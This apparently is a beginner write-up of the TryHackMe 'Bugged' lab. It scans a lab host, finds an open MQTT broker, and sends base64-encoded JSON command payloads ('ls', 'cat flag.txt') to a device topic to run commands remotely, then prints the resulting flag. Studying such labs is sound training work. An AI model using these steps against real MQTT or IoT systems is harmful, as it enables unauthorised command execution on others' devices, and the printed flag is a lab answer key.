Hello everyone\! This is a beginner-friendly room from the TryHackMe platform titled “**Bugged**”

This room is classified as easy and is a walkthrough-type challenge. I hope this write-up helps guide you through the process\!

My goal is to help you understand each step and provide clear explanations so that anyone, whether a beginner or experienced, can follow along and understand the reasoning behind each action. I hope this write-up makes the process smoother and easier to grasp.

Enough talk — let’s dive right in, and I hope you enjoy the journey\! :)

![][image3]

We start by loading the victim IP and performing nmap:

![][image4]

***nmap \-p1–2000 — min-rate=1000 \-T4 \-Pn 10.10.101.222***

\-p1-2000=\>Scan ports **1 to 2000** (faster, smaller range)

\--min-rate=1000=\>Force **at least 1000 packets/second** (fast scan)

\-T4=\>Use **aggressive timing** (fast but stable)

\-Pn=\> **Skip ping** — assume host is up

**Port 1883 open** → this is **MQTT**, a lightweight messaging protocol often used in IoT.

Now, Install **Mosquitto** (MQTT client tools):

![][image5]

***sudo apt install mosquitto mosquitto-clients***

Next, connect to MQTT Broker:

![][image6]

***mosquitto\_sub \-h 10.10.101.222 \-t “\#” \-v***

\# → wildcard to **subscribe to all topics**.  
\-v → show **topic names** with message.

Then while the appliances are showing up I see the base 64 string which catches my attention, so going to cyber chef decoding the base 64 string:

![][image7]

**{**  
**“id”: “cdd1b1c0–1c40–4b0f-8e22–61b357548b7d”,**  
**“registered\_commands”: \[“HELP”, “CMD”, “SYS”\],**  
**“pub\_topic”: “U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub”,**  
**“sub\_topic”: “XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub”**  
**}**

Now using pub\_topic:

![][image8]

***mosquitto\_pub \-t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub \-h 10.10.101.222 \-m “hello”***

This shows “hello” as it is and not encoded

Trying out the sub\_topic:

![][image9]

***mosquitto\_pub \-t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub \-h 10.10.101.222 \-m “hello”***

Now we get a **base64-encoded string** and when I decode it there is an error statement but that gives us the hint

![][image10]

Using the data we have from the inital output and recrafting:

**{**  
**“id”: “cdd1b1c0–1c40–4b0f-8e22–61b357548b7d”,**  
**“cmd”: “CMD”,**  
**“arg”: “ls”**  
**}**

and converting it to base-64:

![][image11]

**eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==**

Now sending it:

![][image12]

***mosquitto\_pub \-t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub \-h 10.10.101.222 \-m “eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==”***

![][image13]

The response shows the flag.txt file existing since we gave ls as the query

![][image14]

Now we reconstruct the command so as to read the flag.txt file and get the flag

![][image15]

This is the encoded base-64:

**eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=**

and now sending it :

![][image16]

***mosquitto\_pub \-t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub \-h 10.10.101.222 \-m “eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=”***

![][image17]

That leads us to the flag:

![][image18]

flag{18d44fc0707ac8dc8be45bb83db54013}
